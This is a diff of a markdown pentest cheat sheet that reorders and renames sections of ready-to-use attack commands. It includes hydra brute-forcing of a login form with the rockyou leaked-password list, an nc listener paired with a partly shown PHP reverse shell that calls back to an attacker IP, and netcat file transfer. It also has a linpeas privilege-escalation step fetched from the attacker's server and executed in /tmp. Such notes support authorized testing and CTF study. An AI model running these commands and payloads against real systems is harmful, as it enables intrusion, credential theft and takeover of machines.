@@ -13,16 +13,6 @@ dirb http://example.com /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com -H "Host: FUZZ.example.com" -mc 200 -fs 15949 -o ffuf_output.json -of json
 ```
 
-## Login brute-force with `hydra`:
-### Syntax 1
-```bash
-sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
-```
-### Syntax 2
-```bash
-sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
-```
-
 ## Web app scan with `nikto`:
 ```bash
 nikto -h example.com -p 80 -o nikto_output.txt
@@ -48,11 +38,11 @@ exploit
 ```
 
 ## PHP reverse shell
-### Listener
+### Listener:
 ```bash
 nc -lvnp 4444
 ```
-### File
+### Reverse shell:
 ```php
 <?php
 $ip = 'x.x.x.x'; // change this to your IP address
@@ -72,6 +62,16 @@ if ($socket) {
     fclose($socket);
 }
 ?>
+```
+
+## Login brute-force with `hydra`:
+### Syntax 1
+```bash
+sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
+```
+### Syntax 2
+```bash
+sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
 ```
 
 ## Send directory with `netcat`
@@ -95,13 +95,15 @@ tar -czvf archive.tar.gz /path/to/directory_or_file
 tar -xzvf archive.tar.gz -C /path/to/extract
 ```
 
-## Download and serve `linpeas`
-### Sender:
+## Privilege escalation with `linpeas`
+### Serve:
 ```bash
+mkdir linpeas
+cd linpeas
 wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 8080
 ```
-### Receiver
+### Download and execute:
 ```bash
 cd /tmp
 wget x.x.x.x:8080/linpeas.sh
